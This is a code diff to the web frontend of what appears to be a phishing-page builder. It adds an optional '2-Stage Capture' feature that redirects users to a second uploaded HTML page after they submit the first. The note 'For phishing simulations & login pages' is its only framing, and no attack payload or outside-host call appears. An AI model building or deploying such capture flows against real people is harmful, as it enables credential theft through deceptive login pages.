@@ -293,6 +293,22 @@
                 <textarea id="customHtml"></textarea>
                 <p class="text-xs text-gray-500 mt-2">✍️ Write raw HTML/CSS/JS. For phishing simulations & login pages.</p>
             </div>
+
+            <!-- 2-Stage Support for Custom HTML -->
+            <div class="mb-5 flex items-start gap-3 p-4 bg-black/30 border border-blue-500/20 rounded-xl">
+                <input type="checkbox" id="enableStage2" onchange="toggleStage2(this)" class="mt-1 w-5 h-5 rounded border-gray-600 text-blue-500 focus:ring-blue-500 accent-blue-500">
+                <div>
+                    <span class="font-semibold text-sm block">🔄 Enable 2-Stage Capture</span>
+                    <small class="text-gray-400 text-xs">If checked, users will be redirected to a second stage after submitting the first.</small>
+                </div>
+            </div>
+
+            <div id="stage2-container" class="hidden mb-5 p-4 border border-blue-500/30 rounded-xl bg-black/20">
+                <label class="block text-sm font-semibold mb-2 text-gray-300">📄 Upload Stage 2 HTML / Code</label>
+                <input type="file" onchange="loadCustomFileStage2(this)" accept=".html,.htm,.txt" class="block w-full text-sm text-gray-400 file:mr-3 file:py-2 file:px-5 file:rounded-full file:border-0 file:text-sm file:font-medium file:bg-blue-600/20 file:text-blue-400 hover:file:bg-blue-600/40 transition mb-3">
+                <textarea id="customHtmlStage2"></textarea>
+                <p class="text-xs text-gray-500 mt-2">✍️ Provide the second stage HTML here.</p>
+            </div>
             <div class="mb-5">
                 <label class="block text-sm font-semibold mb-2 text-gray-300">🎯 Redirect URL (Optional)</label>
                 <input type="text" id="customRedirectUrl" placeholder="https://example.com/dashboard" class="input-modern w-full">
@@ -562,6 +578,13 @@
             payload.customHtml = htmlContent;
             payload.enableInjector = document.getElementById('enableInjector').checked;
             payload.redirectUrl = document.getElementById('customRedirectUrl').value.trim();
+
+            if (document.getElementById('enableStage2').checked) {
+                const htmlStage2Content = editorStage2.getValue();
+                if (htmlStage2Content.trim()) {
+                    payload.customHtmlStage2 = htmlStage2Content;
+                }
+            }
         }
         const token = localStorage.getItem('session_token');
         const headers = { 'Content-Type': 'application/json' };
@@ -592,6 +615,23 @@
         const reader = new FileReader();
         reader.onload = e => editor.setValue(e.target.result);
         reader.readAsText(input.files[0]);
+    }
+
+    function loadCustomFileStage2(input) {
+        if (!input.files[0]) return;
+        const reader = new FileReader();
+        reader.onload = e => editorStage2.setValue(e.target.result);
+        reader.readAsText(input.files[0]);
+    }
+
+    function toggleStage2(checkbox) {
+        const container = document.getElementById('stage2-container');
+        if (checkbox.checked) {
+            container.classList.remove('hidden');
+            editorStage2.refresh(); // refresh codemirror when revealed
+        } else {
+            container.classList.add('hidden');
+        }
     }
 
     // ---------- UI Helpers ----------
